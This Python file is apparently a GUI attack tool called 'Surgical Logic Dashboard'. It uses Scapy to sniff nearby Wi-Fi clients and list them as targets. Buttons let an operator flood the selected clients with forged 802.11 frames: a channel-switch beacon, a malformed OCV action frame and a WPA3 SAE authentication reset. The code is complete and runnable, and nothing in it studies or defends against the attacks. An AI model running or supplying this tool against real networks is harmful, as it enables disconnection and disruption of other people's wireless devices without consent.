import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalDashboard:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.targets = set()
        self.running = True
        
        self.setup_monitor()
        
        self.root = tk.Tk()
        self.root.title("Surgical Logic Dashboard v3.0")
        self.root.geometry("900x700")
        self.root.configure(bg="#050505")

        # --- Target List ---
        tk.Label(self.root, text="DISCOVERED TARGETS (MANUAL SELECT)", fg="#00FF41", bg="#050505").pack(pady=5)
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="multiple", height=15)
        self.listbox.pack(padx=10, fill="both", expand=True)

        # --- Command Center ---
        cmd_frame = tk.Frame(self.root, bg="#050505")
        cmd_frame.pack(pady=10)
        
        tk.Button(cmd_frame, text="CSA WHISPER (STEALTH)", command=lambda: self.execute("CSA"), bg="#0044aa", fg="white", width=20).grid(row=0, column=0, padx=5)
        tk.Button(cmd_frame, text="OCV VIOLATION", command=lambda: self.execute("OCV"), bg="#aa5500", fg="white", width=20).grid(row=0, column=1, padx=5)
        tk.Button(cmd_frame, text="SAE RESET (WPA3)", command=lambda: self.execute("SAE"), bg="#880000", fg="white", width=20).grid(row=0, column=2, padx=5)
        
        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.shutdown, bg="#222", fg="red").pack(pady=10)

        threading.Thread(target=self.scanner, daemon=True).start()

    def setup_monitor(self):
        os.system(f"sudo airmon-ng check kill && sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                    client = dot11.addr2
                    if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
                        self.discovered[client] = {"BSSID": dot11.addr3}
                        self.listbox.insert(tk.END, f"Target: {client} | AP: {dot11.addr3}")
        sniff(iface=self.iface, prn=callback, store=0)

    def execute(self, mode):
        selected = self.listbox.curselection()
        for i in selected:
            mac = list(self.discovered.keys())[i]
            bssid = self.discovered[mac]["BSSID"]
            threading.Thread(target=self.attack_logic, args=(mac, bssid, mode), daemon=True).start()

    def attack_logic(self, target, bssid, mode):
        print(f"[LOGIC] Executing {mode} on {target}")
        base = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)
        
        if mode == "CSA":
            # Stealth Move to Ghost Channel 13
            pkt = base/Dot11Beacon()/Dot11Elt(ID=37, len=3, info=chr(1)+chr(13)+chr(1))
        elif mode == "OCV":
            # Malformed OCV Action Frame
            pkt = base/Dot11Action(category=10, action=4)/Raw(load=b"\xff\x0a\x01\x01")
        elif mode == "SAE":
            # State Machine Reset
            pkt = base/Dot11Auth(algo=3, seqnum=1, status=0)
            
        sendp(pkt, iface=self.iface, count=50, inter=0.05, verbose=False)

    def shutdown(self):
        self.running = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 dashboard.py [iface]")
    else: SurgicalDashboard(sys.argv[1]).root.mainloop()
